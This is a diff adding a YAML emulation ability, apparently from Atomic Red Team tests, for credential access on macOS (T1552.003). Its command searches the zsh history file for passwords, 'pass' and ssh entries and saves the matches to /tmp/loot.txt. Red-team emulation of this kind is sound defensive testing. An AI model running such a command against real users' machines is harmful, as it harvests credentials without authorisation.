@@ -1,0 +1,39 @@
+- id: 8f2765a8-e795-438b-a102-5e25a7adcce1
+  name: Search Through Zsh History
+  description: Search through zsh history for specific commands we want to capture
+  tactic: credential-access
+  technique:
+    attack_id: T1552.003
+    name: 'Unsecured Credentials: Bash History'
+  platforms:
+    darwin:
+      sh:
+        command: cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > /tmp/loot.txt
+        cleanup: 'rm -f #{output_file}'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1552.003
+  - atomic-red-team
+  - credential-access
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      output_file:
+        description: Path where captured results will be placed
+        type: path
+        default: /tmp/loot.txt
+      zsh_history_grep_args:
+        description: grep arguments that filter out specific commands we want to capture
+        type: string
+        default: -e '-p ' -e 'pass' -e 'ssh'
+      zsh_history_filename:
+        description: Path of the zsh history file to capture
+        type: path
+        default: ~/.zsh_history
+    technique_created: '2020-02-04T13:02:11.685Z'
+    atomic_guid: 8f2765a8-e795-438b-a102-5e25a7adcce1
+    import_timestamp: '2026-09-05T06:40:49.868864Z'
